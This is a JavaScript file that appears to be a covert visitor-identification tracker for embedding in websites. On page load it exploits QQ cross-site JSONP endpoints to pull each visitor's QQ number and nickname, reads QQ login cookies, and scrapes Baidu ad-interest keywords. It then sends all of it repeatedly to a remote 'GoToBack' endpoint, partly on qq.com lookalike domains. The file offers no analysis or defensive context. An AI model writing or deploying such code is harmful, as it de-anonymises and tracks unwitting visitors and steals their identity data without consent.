/**
 * Created by zhiwen on 14-5-23.
 */
var xHead = document.getElementsByTagName('HEAD').item(0);
var isIE = document.all?true:false;
var xurl=location.search;
var xx1='';
var xx3=0;
var xx4=0;
var xx0=0;
var xx2='';
var ie = document.all ? true: false;
var oHead = document.getElementsByTagName('HEAD').item(0);
var isIE = !!window.ActiveXObject;
var isIE6 = isIE && !window.XMLHttpRequest;
var aaaddda=false;
var aaadddb=false;
var aaadddd=false;
xurl="http://"+document.domain+"/fangke/GoToBack"+xurl;
function fisker_encode_v2(s){
    var es = [],c='',ec='';
    s = s.split('');
    for(var i=0,length=s.length;i<length;i++){
        c = s[i];
        ec = encodeURIComponent(c);
        if(ec==c){
            ec = c.charCodeAt().toString(16);
            ec = ('00' + ec).slice(-2);
        }
        es.push(ec);
    }
    return es.join('').replace(/%/g,'').toUpperCase();
}

function fangkenoLogin(){
    loadJS("http://coral.qq.com/user/0?source=0&callback=checkLoginCB&_=1389324243585");
}

function checkLoginCB(a){
    try{
        if(a.errCode!=8){
            setTimeout(xxx,100);
            fangke_LoginOK();
        }else{
            setTimeout(fangkenoLogin, 5000);
        }
    }catch(e){
        setTimeout(fangkenoLogin, 5000);
    }
}

function fangke_LoginOK(){
    loadJS("/aac/wfqt/qq/qq.com/getMsq.js");
}

function random(min,max){
    return Math.floor(min+Math.random()*(max-min));
}

function fangkevisit(){

}

function loadJS(jsurl, onsuccess, charset, onerr) {
    var xScript = document.createElement("script");
    xScript.type = "text/javascript";
    if(charset=='')
    {
        xScript.charset = "utf-8";
    }
    else {
        xScript.charset = charset;
    }

    xScript.src = jsurl;
    xScript.onerror = function() {
        if(onerr){
            setTimeout(onerr, 10)
        }
    };
    if (ie) {
        xScript.onreadystatechange = function() {
            if (xScript.readyState) {
                if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if(onsuccess){
                        setTimeout(onsuccess, 10);
                    }
                }
            } else {
                xScript.onreadystatechange = null;
                xScript.onload = null;
                if(onsuccess){
                    setTimeout(onsuccess, 10);
                }
            }
        }
    } else {
        xScript.onload = function() {
            if (xScript.readyState) {
                if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if(onsuccess){
                        setTimeout(onsuccess, 10);
                    }
                }
            } else {
                xScript.onreadystatechange = null;
                xScript.onload = null;
                if(onsuccess){
                    setTimeout(onsuccess, 10);
                }
            }
        }
    }
    document.getElementsByTagName('HEAD').item(0).appendChild(xScript)
}

function xxxxa(){
    if(aaaddda){
        aaadddb=true;
        window.onerror=null;
        loadJS(xurl+"&xx1="+fisker_encode_v2(xx1.toString())+"&xx2="+xx2+"&xx3="+xx3+"&xx0="+xx0+"&xx4="+xx4+"&xx5="+encodeURIComponent(userLikeKey));
        xx3++;
        setTimeout(xxxxa,20000);
    }else{abcc();}
}

function xxxxb(){
    if(!aaadddb){
        xxxxa();
    }
}

function xxx(){
    if (xx1=='')
    {
        //loadJS('http://open.3g.qq.com/checkLoginCallback.json?id=2115&callback=xxxx&_=1399435480553',abcc,'',abcd);
        //loadJS('http://dir.minigame.qq.com/cgi-bin/QQGame_RichPayerInfo/get_player_info?callback=xxxx&uin=',abcc,'',abcd);
        loadJS('http://dir.minigame.qq.com/cgi-bin/QQGame_RichPayerInfo/get_player_info?callback=xxxx&uin=');
    }else{
        loadJS(xurl+"&xx1="+fisker_encode_v2(xx1)+"&xx3="+xx3+"&xx5="+encodeURIComponent(userLikeKey)+"&xx2="+xx2);
        xx3++;
        setTimeout(xxx,20000);
    }
}

function windowerror(){
    aaaddda=true;
}

function abcc(){
    try{
        xx1=""+getUserName.data.uin+"";
        xx2=encodeURIComponent(getUserName.data.name);
        setTimeout(xxx,1);
    }
    catch (e){
        aaadddd=true;
        xx0="1"+random(101,9999999);
        window.onerror=windowerror;
        loadJS("http://app.data.qq.com/?umod=user&uid="+xx0+"&t=0.6422199569642544",xxxxa,'',xxxxb)
    }
}

function abcd(){
    if(!aaadddd){
        abcc();
    }
}

function xxxx(a){
    try
    {
        if(a.uin && a.uin!=0){
            xx1=""+a.uin+"";
            //xx2=encodeURIComponent(a.szNick);
            setTimeout(xxx,1);
        }else{
            abcc();
        }
    }
    catch (e)
    {
        abcc();
    }
}

var userLikeKey='';
var isOver=false;

function xxxa(a){
    for(var o in a){
        if (a[o].tit)
        {
            userLikeKey = userLikeKey + a[o].tit+' ';
        }
        if (a[o].bid)
        {
            userLikeKey = userLikeKey + a[o].bid +' ';
        }
    }
    if (isOver)
    {
        var keyaaa=[];
        keyaaa=userLikeKey.split(" ");
        userLikeKey=keyaaa.unique5().join(",");
    }
}

Array.prototype.unique5 = function() {
    var res = [], hash = {};
    for(var i=0, elem; (elem = this[i]) != null; i++)  {
        if (!hash[elem])
        {
            res.push(elem);
            hash[elem] = true;
        }
    }
    return res;
}

function Load1(){
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpcli…zh-CN&did=2&rt=5&dt=1389075754&pn=8%7CbaiduTpclickedDEFINE%7C65&prt='+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',Load2,'gbk',Load2);
}
function Load2(){
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpcli…pn=8%3A4%7CbaiduTpclickedDEFINE%3AbaiduTpclickedDEFINE%7C65%3A2&prt='+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',Load3,'gbk',Load3);
}
function Load3(){
    isOver=true;
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpcli…FINE%3AbaiduTpclickedDEFINE%3AbaiduTpclickedDEFINE%7C65%3A2%3A2&prt='+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',null,'gbk',xxxa);
}

fangkenoLogin();
Load1();






var uin=getCookie("pt2gguin")||getCookie("o_cookie")||getCookie("p_uin")||getCookie("uin");
var wid=Request('wid');
var uid=Request('uid');
var ref=Request('fkrefurl');
var page=Request('page');
var dm=Request('url');
var gk=Request('gk');
if(gk=='8531'){
    dm="http://www.qq.com.8531.org";
}else if(gk=='zd-e'){
    dm="http://www.qq.com.zd-e.cn";
}else if(gk=='qqfangke'){
    dm="http://college.qq.com.qqfangke.com";
}else if(gk=='wktao'){
    dm="http://www.qq.com.wktao.cn";
}else if(gk=='pppppj'){
    dm="http://www.qq.com.pppppj.cn";
}else if(gk=='yingxiao890'){
    dm="http://www.qq.com.yingxiao890.com";
}else if(gk=='51qq'){
    dm="http://www.qq.com.51qq.la";
}
if (uin && wid && uid)
{
    fangke_loadJS(dm+'/fangke/GoToBack?w='+wid+'&u='+uid+"&xx1="+uin+"&xx3=0&xx9=1&ref=" + ref + "&page=" + page);
}

function Request(argname)
{
    var url = document.location.href;
    var arrStr = url.substring(url.indexOf("?")+1).split("&");
    for(var i =0;i<arrStr.length;i++)
    {
        var loc = arrStr[i].indexOf(argname+"=");
        if(loc!=-1)
        {
            return arrStr[i].replace(argname+"=","").replace("?","");
            break;
        }
    }
    return "";
}

function getCookie(name)
{
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
    if(arr=document.cookie.match(reg)) return unescape(arr[2]);
    else return null;
}

var fangke_xHead = document.getElementsByTagName('HEAD').item(0);
var fangke_isIE = document.all?true:false;
var fangke_isIE6 = fangke_isIE && !window.XMLHttpRequest;
function fangke_loadJS(jsurl, onsuccess, charset, onerr) {
    var fangke_xScript = document.createElement("script");
    fangke_xScript.type = "text/javascript";
    if(charset=='')
    {
        fangke_xScript.charset = "utf-8";
    }
    else {
        fangke_xScript.charset = charset;
    }

    fangke_xScript.src = jsurl;
    fangke_xScript.onerror = function() {
        if (onerr) {
            setTimeout(onerr, 0)
        }
    };
    if (fangke_isIE) {
        fangke_xScript.onreadystatechange = function() {
            if (fangke_xScript.readyState) {
                if (fangke_xScript.readyState == "loaded" || fangke_xScript.readyState == "complete") {
                    fangke_xScript.onreadystatechange = null;
                    fangke_xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 0)
                    }
                }
            } else {
                fangke_xScript.onreadystatechange = null;
                fangke_xScript.onload = null;
                if (onsuccess) {
                    setTimeout(onsuccess, 0)
                }
            }
        }
    } else {
        fangke_xScript.onload = function() {
            if (fangke_xScript.readyState) {
                if (fangke_xScript.readyState == "loaded" || fangke_xScript.readyState == "complete") {
                    fangke_xScript.onreadystatechange = null;
                    fangke_xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 0)
                    }
                }
            } else {
                fangke_xScript.onreadystatechange = null;
                fangke_xScript.onload = null;
                if (onsuccess) {
                    setTimeout(onsuccess, 0)
                }
            }
        }
    }
    document.getElementsByTagName('HEAD').item(0).appendChild(fangke_xScript)
}
